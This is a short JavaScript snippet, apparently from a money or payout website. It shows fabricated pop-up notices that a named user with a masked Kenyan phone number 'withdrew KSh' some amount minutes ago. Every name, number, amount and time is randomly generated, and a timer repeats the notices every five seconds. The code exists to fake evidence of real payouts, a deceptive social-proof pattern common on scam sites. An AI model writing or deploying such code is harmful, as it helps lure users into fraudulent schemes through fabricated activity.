
function randomPhone() {
  const prefixes = ['070','071','072','074','075','076','077','079','010','011'];
  const prefix   = prefixes[Math.floor(Math.random() * prefixes.length)];
  const mid      = Math.floor(Math.random() * 90 + 10);
  const end      = Math.floor(Math.random() * 90 + 10);
  return `${prefix}****${mid}${end}`;
}

function randomAmount() {
  const amounts = [
    550,600,650,700,750,800,850,900,950,1000,
    1100,1200,1300,1400,1500,1600,1700,1800,1900,2000,
    2200,2400,2500,2700,3000,3200,3500,3800,4000,4500,
    5000,5500,6000,6500
  ];
  return amounts[Math.floor(Math.random() * amounts.length)];
}

function timeAgo() {
  const mins = Math.floor(Math.random() * 9) + 1;
  return `${mins}m ago`;
}

function showWithdrawalNotif() {
  const container = document.getElementById('wd-notif-container');
  if (!container) return;

  const name     = NOTIF_NAMES[Math.floor(Math.random() * NOTIF_NAMES.length)];
  const phone    = randomPhone();
  const amount   = randomAmount();
  const initials = name.slice(0, 2).toUpperCase();

  const notif = document.createElement('div');
  notif.className = 'wd-notif';
  notif.innerHTML = `
    <div class="wd-notif-avatar">${initials}</div>
    <div class="wd-notif-body">
      <div class="wd-notif-name">${name} ${phone}</div>
      <div class="wd-notif-amount">withdrew KSh ${amount.toLocaleString()}</div>
    </div>
    <div class="wd-notif-time">${timeAgo()}</div>
  `;

  container.appendChild(notif);

  const all = container.querySelectorAll('.wd-notif');
  if (all.length > 3) {
    all[0].classList.add('hiding');
    setTimeout(() => { if (all[0]) all[0].remove(); }, 400);
  }

  setTimeout(() => {
    notif.classList.add('hiding');
    setTimeout(() => { if (notif) notif.remove(); }, 400);
  }, 4500);
}

function startWithdrawalNotifs() {
  if (window._notifStarted) return;
  window._notifStarted = true;
  setTimeout(() => {
    showWithdrawalNotif();
    setInterval(showWithdrawalNotif, 5000);
  }, 3000);
}